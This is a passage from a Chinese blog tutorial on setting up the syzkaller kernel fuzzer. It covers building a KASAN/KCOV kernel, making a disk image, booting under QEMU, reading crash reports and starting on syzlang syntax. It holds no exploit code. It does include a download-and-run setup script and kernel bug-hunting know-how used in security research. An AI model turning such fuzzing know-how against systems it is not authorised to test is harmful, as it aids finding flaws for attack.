class="hljs-built_in">cd</span> gopath/src/github.com/google/syzkaller/</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make</span><br></code></pre></td></tr></table></figure><h2 id="编译目标内核"><a href="#编译目标内核" class="headerlink" title="编译目标内核"></a>编译目标内核</h2><p>从镜像站随便拉一个版本的源码过来就行，笔者这里拉了一个 5.11 版本的内核</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://mirrors.tuna.tsinghua.edu.cn/kernel/v5.x/linux-5.11.tar.gz</span><br></code></pre></td></tr></table></figure><p>解压</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">tar -zxvf linux-5.11.tar.gz</span> <br></code></pre></td></tr></table></figure><p>然后执行下面这两条指令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> defconfig</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> kvm_guest.config</span><br></code></pre></td></tr></table></figure><p>对于老版本内核，应当为：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> defconfig</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> kvmconfig</span><br></code></pre></td></tr></table></figure><p>接下来编辑 <code>.config</code> 文件，在其末尾添加如下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">CONFIG_KCOV=y<br>CONFIG_DEBUG_INFO=y<br>CONFIG_KASAN=y<br>CONFIG_KASAN_INLINE=y<br>CONFIG_CONFIGFS_FS=y<br>CONFIG_SECURITYFS=y<br></code></pre></td></tr></table></figure><p>接下来开始编译内核，这个时候可以简单开一局你喜欢的游戏慢慢等待（笑）</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> olddefconfig</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">make CC=<span class="hljs-string">&quot;/usr/bin/gcc&quot;</span> -j64</span><br></code></pre></td></tr></table></figure><p>这里笔者还遇到一个问题，**笔者的 gcc 版本太高了…**于是编译的时候又出现了这个错误：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cc1: error: ‘-fcf-protection’ is not compatible with this target<br></code></pre></td></tr></table></figure><p><strong>切换回官方推荐的 gcc8 后重新进行编译</strong></p><blockquote><p>笔者<del>向生活妥协了，</del>暂时没找到高版本 gcc 在这个配置下能够成功编译的方法</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install gcc-8 gcc-8-multilib</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install g++-8 g++-8-multilib</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo update-alternatives --install /usr/bin/gcc gcc  /usr/bin/gcc-8 1</span><br></code></pre></td></tr></table></figure><p>出现下面这行就标志着编译完成</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Kernel: arch/x86/boot/bzImage is ready  (#1)<br></code></pre></td></tr></table></figure><p>编译出来的 bzImage 在 <code>arch/x86/boot/bzImage</code>，vmlinux 则就在源码根目录下，这两个文件前者是压缩后的内核后者是原始内核文件</p><h2 id="配置-ext4-硬盘镜像文件"><a href="#配置-ext4-硬盘镜像文件" class="headerlink" title="配置 ext4 硬盘镜像文件"></a>配置 ext4 硬盘镜像文件</h2><p>这里我们使用 <code>debootstrap</code> 来创建ext4硬盘镜像</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt-get install debootstrap</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">mkdir</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cd</span> image</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">wget https://raw.githubusercontent.com/google/syzkaller/master/tools/create-image.sh -O create-image.sh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">chmod</span> +x create-image.sh</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">./create-image.sh</span><br></code></pre></td></tr></table></figure><blockquote><p>wget 的这一步<strong>需要翻墙</strong>（<code>raw.githubusercontent.com</code> 在国内似乎是被墙了，总之笔者记忆里从没成功在不翻墙的情况下成功上去过），若嫌麻烦可以直接 copy <a href="/download/create-image.sh">笔者已经下好的</a></p></blockquote><p>这一步不知道是因为网络原因还是别的原因<strong>总而言之非常的慢</strong>（比上面编译内核耗时还长），完成之后如下：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ll</span><br>total 554772<br>drwxrwxr-x  3 arttnba3 arttnba3       4096 Nov 12 03:02 ./<br>drwxrwxr-x  7 arttnba3 arttnba3       4096 Nov 12 00:53 ../<br>drwxr-xr-x 21 root     root           4096 Nov 12 02:58 chroot/<br>-rwxrwxr-x  1 arttnba3 arttnba3       6360 Nov 11 23:25 create-image.sh*<br>-rw-------  1 arttnba3 arttnba3       2602 Nov 12 03:02 stretch.id_rsa<br>-rw-r--r--  1 arttnba3 arttnba3        569 Nov 12 03:02 stretch.id_rsa.pub<br>-rw-rw-r--  1 arttnba3 arttnba3 2147483648 Nov 12 03:02 stretch.img<br></code></pre></td></tr></table></figure><p>我们可以在文件目录下找到一个名为 <code>stretch.img</code> 的文件，这个文件就是构建好的磁盘镜像文件</p><h2 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h2><p>这一步还是比较简单的，需要注意的是如果你和笔者一样在 VMware 上使用 Linux 则应当在设置中把 <code>虚拟化 Intel VT-x/EPT 或 AMD-V/RVI(V)</code> 打开</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo apt install qemu-system-x86</span><br></code></pre></td></tr></table></figure><p>完成这一切之后看看内核是否能够被成功启动，启动脚本如下（别忘了替换内核镜像与硬盘镜像的路径）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br>qemu-system-x86_64 \<br>-m 2G \<br>-smp 2 \<br>-kernel ./bzImage \<br>-append <span class="hljs-string">&quot;console=ttyS0 root=/dev/sda earlyprintk=serial net.ifnames=0&quot;</span> \<br>-drive file=./stretch.img,format=raw \<br>-net user,host=10.0.2.10,hostfwd=tcp:127.0.0.1:10021-:22 \<br>-net nic,model=e1000 \<br>-enable-kvm \<br>-nographic \<br>-pidfile vm.pid \<br>2&gt;&amp;1 | <span class="hljs-built_in">tee</span> vm.log<br></code></pre></td></tr></table></figure><p>默认 root 账户无密码，成功登入</p><p><img src="https://i.loli.net/2021/11/12/v5sQXyulgK92Mq1.png" alt="image.png"></p><p>前面在配置硬盘镜像文件时还给我们提供了 ssh key，我们也可以用 ssh 来直接连接至虚拟机：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">ssh -i ./stretch.id_rsa -p 10021 -o <span class="hljs-string">&quot;StrictHostKeyChecking no&quot;</span> root@localhost</span><br></code></pre></td></tr></table></figure><p>至此，需要的环境就都配置完成了</p><h1 id="0x02-开始使用-syzkaller"><a href="#0x02-开始使用-syzkaller" class="headerlink" title="0x02.开始使用 syzkaller"></a>0x02.开始使用 syzkaller</h1><h2 id="PRE-工作原理"><a href="#PRE-工作原理" class="headerlink" title="PRE.工作原理"></a><em>PRE.工作原理</em></h2><p>对于 syzkaller 的架构，官方给出了这样的一张 Overview</p><p><img src="https://i.loli.net/2021/11/11/LxNvdhpEX2sBjYc.png" alt="image.png"></p><ul><li><p><code>syz-manager</code> ：syzkaller 的控制中枢，其会启动多个 VM 实例（如图所示的一个黄色卡片就是一个实例）并进行监视，同时通过 RPC 来启动 <code>syz-fuzzer</code></p></li><li><p><code>syz-fuzzer</code> ：负责引导整个 fuzz 的过程：</p><ul><li>生成 input</li><li>启动 <code>syz-executor</code> 进程进行 fuzz</li><li>从被 fuzz 的 kernel 的 <code>/sys/kernel/debug/kcov</code> 获得覆盖（coverage）的相关信息</li><li>通过 RPC 将新的覆盖回送到 <code>syz-manager</code></li></ul></li><li><p><code>syz-executor</code>：负责<strong>执行单个输入</strong>——从 <code>syz-fuzzer</code> 处接受 input 并执行，最后回送结果</p></li></ul><h2 id="配置文件（for-test）"><a href="#配置文件（for-test）" class="headerlink" title="配置文件（for test）"></a>配置文件（for test）</h2><p>我们需要为 syzkaller 编写额外的配置文件，一个简单的例子如下，这里需要注意替换为你自己的路径，包括 <code>workdir</code> 文件夹你应当手动 mkdir 一个：</p><blockquote><p>config.cfg</p></blockquote><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br>        <span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;linux/amd64&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;http&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;workdir&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller/workdir&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;kernel_obj&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/linux-5.11&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.img&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;sshkey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.id_rsa&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;syzkaller&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;procs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;qemu&quot;</span><span class="hljs-punctuation">,</span><br>        <span class="hljs-attr">&quot;vm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br>                <span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;kernel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/syzkaller/bzImage&quot;</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;cpu&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br>                <span class="hljs-attr">&quot;mem&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2048</span><br>        <span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h2 id="启动-syzkaller"><a href="#启动-syzkaller" class="headerlink" title="启动 syzkaller"></a>启动 syzkaller</h2><p>在 syzkaller 目录下输入如下命令启动 syzkaller：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">./bin/syz-manager -config=config.cfg</span><br></code></pre></td></tr></table></figure><p>成功启动后我们可以通过访问 <code>localhost:56741</code> 来获取 syzkaller 的状态，效果如下图所示：</p><p><img src="https://i.loli.net/2021/11/12/BnYuNbO2MdiEw5V.png" alt="image.png"></p><h3 id="可能会遇到的问题"><a href="#可能会遇到的问题" class="headerlink" title="*可能会遇到的问题"></a><em>*可能会遇到的问题</em></h3><h4 id="无法启动-vm-instance"><a href="#无法启动-vm-instance" class="headerlink" title="无法启动 vm instance"></a>无法启动 vm instance</h4><p>有可能会遇到无法启动 vm instance 的问题，报错形式大致如下：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs llvm">qemu-system-<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>: error: failed <span class="hljs-keyword">to</span> set MSR <span class="hljs-number">0x48f</span> <span class="hljs-keyword">to</span> <span class="hljs-number">0x7fffff00036dfb</span><br>qemu-system-<span class="hljs-keyword">x</span><span class="hljs-number">86</span>_<span class="hljs-number">64</span>: ../../<span class="hljs-keyword">target</span>/<span class="hljs-type">i386</span>/kvm/kvm.<span class="hljs-keyword">c</span>:<span class="hljs-number">2753</span>: kvm_buf_set_msrs: Assertion `<span class="hljs-keyword">ret</span> <span class="hljs-operator">=</span><span class="hljs-operator">=</span> cpu-&gt;kvm_msr_buf-&gt;nmsrs&#x27; failed.<br></code></pre></td></tr></table></figure><p>按照官方给出的解决办法是在 qemu 的启动参数中去掉 <code>-cpu host,migratable=off</code>，我们需要在配置文件的 <code>vm</code> 项中添加 <code>qemu-args</code>项，值为 <code>-enable-kvm</code>，如下：</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;target&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;linux/amd64&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;http&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;127.0.0.1:56741&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;workdir&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller/workdir&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;kernel_obj&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/linux-5.11&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;image&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.img&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;sshkey&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/image/stretch.id_rsa&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;syzkaller&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Documents/golang/gopath/src/github.com/google/syzkaller&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;procs&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">8</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;type&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;qemu&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;vm&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><br><span class="hljs-attr">&quot;count&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">4</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;kernel&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;/home/arttnba3/Desktop/kernel/syzkaller/bzImage&quot;</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;cpu&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;mem&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-number">2048</span><span class="hljs-punctuation">,</span><br><span class="hljs-attr">&quot;qemu_args&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;-enable-kvm&quot;</span><br><span class="hljs-punctuation">&#125;</span><br><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure><h4 id="网络设备问题"><a href="#网络设备问题" class="headerlink" title="网络设备问题"></a>网络设备问题</h4><p>在 syzkaller 挖掘过程中可能出现如下报错信息：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">[FAILED] Failed to start Raise network interfaces.<br></code></pre></td></tr></table></figure><p>虽然似乎还是能正常启动的</p><h2 id="crash-分析"><a href="#crash-分析" class="headerlink" title="crash 分析"></a>crash 分析</h2><p>笔者本来想写一个有漏洞点内核模块来人为制造 crash，不过现在刚开挖没几分钟就出了一个 crash，由于用的是 5.11 版本的内核，已经不算太新了，笔者认为应该是挖到了现有的 CVE，通过 Google 笔者也找到了一个<a href="https://syzkaller.appspot.com/bug?id=ad240ff5c32ca4f3406dc3acca519370693bb47c">基本上是一样的 crash</a>，不过我们还是来简单分析一下</p><p><img src="https://i.loli.net/2021/11/12/7EHYatBoG6KFxqR.png" alt="image.png"></p><p>在 Description 项中说明了 crash 的简要信息，点开分为两项：<code>log</code> 和 <code>report</code></p><p><img src="https://i.loli.net/2021/11/12/Q6dBoPOHm7sRtgI.png" alt="image.png"></p><p>log 中给出的是 fuzz 的流程，包括运行的系统调用、输入参数等一系列信息，因为是自动生成的所以一般不会特别好看</p><p><img src="https://i.loli.net/2021/11/12/ANwKC67iRQL2ZHt.png" alt="image.png"></p><p>report 中给出的则是 kernel 相关信息，例如调用栈回溯等</p><p><img src="https://i.loli.net/2021/11/12/UvNkQe7ElAHSKm6.png" alt="image.png"></p><p>比较可惜的是这个 crash <strong>没法重现</strong>，在一个 crash 刚刚生成时 syzkaller 会尝试进行重现，此时 report 的状态会显示为 <code>reproducing</code>，若成功了则会显示对应的结果，品相比较好的一种 report 就是 <code>has C repo</code>：有产生该 crash 的 C 代码</p><p><img src="https://i.loli.net/2021/11/12/l47kcaVMS9wH6u5.png" alt="image.png"></p><h1 id="0x03-使用-syzlang-编写描述文件进行-fuzz"><a href="#0x03-使用-syzlang-编写描述文件进行-fuzz" class="headerlink" title="0x03.使用 syzlang 编写描述文件进行 fuzz"></a>0x03.使用 syzlang 编写描述文件进行 fuzz</h1><p>直接就这样挂着肯定不能直接就把洞挖出来<del>虽然笔者前面没挂一会就出了一个crash</del>，因此接下来我们需要人工配置系统调用模板，以<strong>有针对性地</strong>进行漏洞挖掘</p><p>syzkaller 使用它自己的声明式语言（Syscall Description Language，aka <code>syzlang</code>（读作 <code>[siːzˈlæŋg]</code>，<del>笔者以前一直读作 [saiːzˈlæŋg]…</del>））来描述系统调用模板，在安装目录下的 <code>docs/syscall_descriptions.md</code> 与 <code>docs/syscall_descriptions_syntax.md</code> 中有着相关的说明，在笔者看来是类似 C 的一门描述语言</p><p>我们需要使用 syzlang 来编写特定的系统调用描述文件（也叫规则文件，后文中这两个词指的是同一个东西），syzkaller 会根据我们的描述文件有针对性地进行 fuzz</p><p><a href="https://github.com/google/syzkaller/blob/master/sys/linux/sys.txt">这是 Google 给出的一个例子</a></p><blockquote><p>笔者看着也是比较头大的…还是慢慢来吧…</p><p>以下主要是翻译谷歌官方的文档（<del>谁叫国内没有中文文档呢</del>），外加一些笔者自己本人的理解以及补充说明</p></blockquote><h2 id="syzlang-语法"><a href="#syzlang-语法" class="headerlink" title="syzlang 语法"></a>syzlang 语法</h2><p>syzlang 的语法结构如下，<del>看完你也能快速上手！</del>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">syscallname &quot;(&quot; [arg [&quot;,&quot; arg]*] &quot;)&quot; [type] [&quot;(&quot; attribute* &quot;)&quot;]<br>arg = argname type<br>argname = identifier<br>type = typename [ &quot;[&quot; type-options &quot;]&quot; ]<br>typename = &quot;const&quot; | &quot;intN&quot; | &quot;intptr&quot; | &quot;flags&quot; | &quot;array&quot; | &quot;ptr&quot; |<br>   &quot;string&quot; | &quot;strconst&quot; | &quot;filename&quot; | &quot;glob&quot; | &quot;len&quot; |<br>   &quot;bytesize&quot; | &quot;bytesizeN&quot; | &quot;bitsize&quot; | &quot;vma&quot; | &quot;proc&quot;<br>type-options = [type-opt [&quot;,&quot; type-opt]]<br></code></pre></td></tr></table></figure><blockquote><p>这个时候你需要把自己当作一个 scanner + parser（大雾</p><p><del>正则表达式相信大家应该都学过，哪怕没学过编译原理课上你总会学到的，那么按照正则来看的话其实这个语法结构并不难解析</del>（</p></blockquote><p>以下是对其中的一些符号说明，<strong>不是 syzlang 实际语法内容</strong>：</p><ul><li>双引号 <code>&quot;&quot; </code>表示这个符号内的东西表示<strong>要按其原样进行匹配</strong>，丢弃双引号</li><li>或符号 <code>|</code> 表示值可以取左边也可以取右边</li><li>等于号 <code>=</code> 表示左边的表达式应当为右边的形式</li><li>中括号 <code>[]</code> 表示一个<strong>可选表达式</strong>，取其内的值并丢弃中括号</li><li>星号 <code>*</code> 表示<strong>闭包</strong>，即 0 次或多次的自我连接  <del>什么？你还没学过离散数学</del></li></ul><p>这是谷歌官方给出的一个例子：</p><blockquote><p><code>syzkaller</code> uses declarative description of syscall interfaces to manipulate programs (sequences of syscalls). Below you can see (hopefully self-explanatory) excerpt from the descriptions:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">open(file filename, flags flags[open_flags], mode flags[open_mode]) fd<br>read(fd fd, buf buffer[out], count len[buf])<br>close(fd fd)<br>open_mode = S_IRUSR, S_IWUSR, S_IXUSR, S_IRGRP, S_IWGRP, S_IXGRP, S_IROTH, S_IWOTH, S_IXOTH<br></code></pre></td></tr></table></figure><p><del>斯密🦄赛，👴没法做到 self-explanatory</del></p></blockquote><h3 id="O-注释与文件包含"><a href="#O-注释与文件包含" class="headerlink" title="O.注释与文件包含"></a>O.注释与文件包含</h3><p>syzlang 中的注释与 shell 脚本注释形式相同，为以 <code>#</code> 开头的单行注释</p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang"># this is a useful sentence! do not delete it!<br></code></pre></td></tr></table></figure><p>在 syzlang 中，我们可以额外引入<strong>内核源码文件</strong>作为参数、系统调用…等等一系列的补充，形式与 C 语言的 include 语句大致相同，不过**没有了开头的”#”**（因为 # 开头是注释）</p><p>这是一个🌰：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">include &lt;linux/fs.h&gt;<br></code></pre></td></tr></table></figure><h3 id="I-参数（arg）与参数名（argname）"><a href="#I-参数（arg）与参数名（argname）" class="headerlink" title="I.参数（arg）与参数名（argname）"></a>I.参数（arg）与参数名（argname）</h3><p>我们输入给系统调用模板的 <code>参数 （arg）</code> 应当为如下形式：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">arg = argname type<br></code></pre></td></tr></table></figure><p>即一个参数由 <code>参数名 （argname）  </code> 与 <code>类型（type）</code> 组成</p><p>其中，参数名便是 <code>标识符（identifier）</code></p><h4 id="example"><a href="#example" class="headerlink" title="example"></a>example</h4><p>这么讲有些空泛，我们来简单看一个例子，在 Linux 中系统调用 <code>read</code> 的声明（其实是定义）如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c">SYSCALL_DEFINE3(read, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span>, fd, <span class="hljs-type">char</span> __user *, buf, <span class="hljs-type">size_t</span>, count)<br></code></pre></td></tr></table></figure><p>当我们使用 libc 的 wrapper 进行 read 系统调用时，形式如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> my_file_fd = open(<span class="hljs-string">&quot;/dev/a3dev&quot;</span>, O_RDONLY);<br><span class="hljs-type">char</span> my_buf[<span class="hljs-number">114514</span>];<br><span class="hljs-type">size_t</span>my_count = <span class="hljs-number">114514</span>;<br>read(my_file_fd, my_buf, my_count);<br></code></pre></td></tr></table></figure><p>在这个例子当中，<code>fd、buf、count</code> 便是 <strong>argname</strong>，<code>my_file_fd、my_buf、my_count</code> 便是 <strong>type</strong></p><p>那么，在我们使用 syzlang 编写系统调用模板时，例如 read 的第一个参数，我们应该写成下面这个样子（假设 my_file_fd 已定义为一个 <code>resources</code>（后面会讲））：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">fd my_file_fd<br></code></pre></td></tr></table></figure><h3 id="II-类型（type）"><a href="#II-类型（type）" class="headerlink" title="II.类型（type）"></a>II.类型（type）</h3><blockquote><p>其实这么翻译笔者觉得好像不大准确，不过笔者英文不大行所以这里暂且直译…</p></blockquote><p>前面我们讲到一个 <code>arg</code> 由 一个 <code>argname </code>与 <code>type</code> 组成，argname 我们已经讲了，现在我们来讲 type</p><p>type 的定义同样由两部分组成——<code>类型名（typename）</code> 与 <code>类型选项（type-options）</code>：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs syzlang">type = typename [ &quot;[&quot; type-options &quot;]&quot; ]<br></code></pre></td></tr></table></figure><h4 id="类型名（typename）"><a href="#类型名（typename）" class="headerlink" title="类型名（typename）"></a>类型名（typename）</h4><p>即该 type 的类型，例如 C 当中的int、char、void 等等</p><p>常规选项包括：</p><ul><li><strong>opt</strong>：这是一个可选参数（例如 mmap 的 fd）</li></ul><p>其余 type-options 是基于特定 type 的，如下：</p><ul><li><p><strong>const</strong>：整型常数</p><ul><li>类型选项：<ul><li>值（value）：例如 <code>0</code></li><li>基础类型（underlying type）：<code>intN</code> 或 <code>intptr</code> 之一</li></ul></li></ul></li><li><p><strong>intN</strong> 或 